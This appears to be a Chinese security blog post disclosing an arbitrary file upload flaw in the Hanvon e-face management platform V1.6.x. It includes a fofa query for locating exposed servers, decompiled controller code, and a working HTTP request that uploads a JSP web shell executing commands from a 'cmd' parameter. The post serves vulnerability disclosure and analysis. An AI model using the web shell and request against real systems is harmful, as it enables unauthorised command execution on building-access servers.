---
title: "汉王e脸通综合管理平台 mobiMeetingApp/uploadMeetingFile.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-mobiMeetingApp-uploadMeetingFile-upload-rce.html
asset_dir: assets/汉王e脸通综合管理平台-mobimeetingappuploadmeetingfile.do-任意文件上传漏洞
---

# 汉王e脸通综合管理平台 mobiMeetingApp/uploadMeetingFile.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/21 08:14
- 1016浏览
- [0评论](#comment)
- 52分钟阅读

深入探索

应用

应用程序

application

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `mobiMeetingApp/uploadMeetingFile.do` 接口存在任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。攻击者可在无需认证的情况下，通过向该接口上传恶意文件，实现任意文件上传，进而可能导致[远程代码执行](https://mrxn.net/tag/rce)或服务器被控制，严重威胁系统安全。

漏洞扫描服务

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"
>
> 物流软件安全

# 漏洞分析

深入探索

Docker加速服务

SQL注入检测工具

漏洞预警服务

看下 `MobiMeetingAppController` 的关于 `mobiMeetingApp/uploadMeetingFile.do` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"uploadMeetingFile.do"},
        method = {RequestMethod.POST}
    )
    public MethodResult uploadMeetingFile(HttpServletRequest request, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                String fileName = null;
                String fileType = null;
                if (!ServletFileUpload.isMultipartContent(request)) {
                    methodResult = MethodResult.errorResult("网络错误！");
                    return methodResult;
                }

                MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
                Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
                String uploadPath = null;

                for(Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
                    MultipartFile mf = (MultipartFile)entity.getValue();
                    if (!mf.isEmpty()) {
                        String fileTypeStr = mf.getOriginalFilename();
                        String fileId = UUID.randomUUID().toString().replace("-", "");
                        fileName = fileTypeStr.split("\\.")[0];
                        fileType = fileTypeStr.split("\\.")[1];
                        String path = request.getSession().getServletContext().getRealPath("/resource");
                        File tmpFile = new File(path);
                        if (!tmpFile.exists()) {
                            tmpFile.mkdir();
                        }

                        uploadPath = path + "/" + fileId + "." + fileType;
                        File targetFile = new File(uploadPath);
                        logger.error("文件存储地址测试" + uploadPath);
                        Files.copy(mf.getInputStream(), targetFile.toPath(), new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});
                        uploadPath = fileId + "." + fileType;
                        fileName = fileName + "." + fileType;
                    }
                }

                Map<String, Object> map = new HashMap();
                map.put("fileName", fileName);
                map.put("fileType", fileType);
                map.put("path", uploadPath);
                methodResult = MethodResult.successResult(map, "上传成功！");
```

跟进 `uploadMeetingFile` ，重点看下

软件

```
public void uploadMeetingFile(HttpServletRequest request, VisitorMapTpm visitorMapTpm) throws IOException {
    String updatedPhoto = visitorMapTpm.getUpdatedPhoto();
    String fileId = UUID.randomUUID().toString().replace("-", "");
    String fileType = visitorMapTpm.getFileType();
    String path = request.getSession().getServletContext().getRealPath("/resource");
    String savePath = path + "\\" + fileId + "." + fileType;
    GetPhoto.generateImageByBase64(updatedPhoto, savePath);
    String uploadPath = fileId + "." + fileType;
    visitorMapTpm.setUpdatedPhotoPath(uploadPath);
    visitorMapTpm.setModifyTime(DateUtils.getDate());
    this.visMapConfigDsm.updateVisitorMap(visitorMapTpm);
    if (visitorMapTpm.getVisMapSignTpmList() != null) {
        List<VisMapSignTpm> visMapSignTpmList = visitorMapTpm.getVisMapSignTpmList();
        if (visMapSignTpmList != null) {
            Long mapId = visitorMapTpm.getId();
            this.visMapSignDsm.deleteByPrimaryKey(mapId);

            for(VisMapSignTpm visMapSignTpm : visMapSignTpmList) {
                visMapSignTpm.setNgMapId(mapId);
                visMapSignTpm.setMapState(visitorMapTpm.getMapState());
                visMapSignTpm.setIdDevClass(visMapSignTpm.getId() + "@" + visMapSignTpm.getDeviceClass());
                this.visMapSignDsm.insertVisMapSignTpm(visMapSignTpm);
            }
        }
    }

}
```

直接保存文件到 `resource` 目录，全程无过滤和校验，造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
POST /manage/mobiMeetingApp/uploadMeetingFile.do HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxxx获取的token
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/jpeg

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

访问文件执行命令 `/manage/resource/xxxxx.jsp?cmd=whoami`

[![汉王e脸通综合管理平台 mobiMeetingApp/uploadMeetingFile.do 任意文件上传漏洞](images/img-001-349b64ed3239.webp)](https://image.mrxn.net/0a402b2ec35142cf822fb7546ce4096d.webp)

成功得到 `whoami` [命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
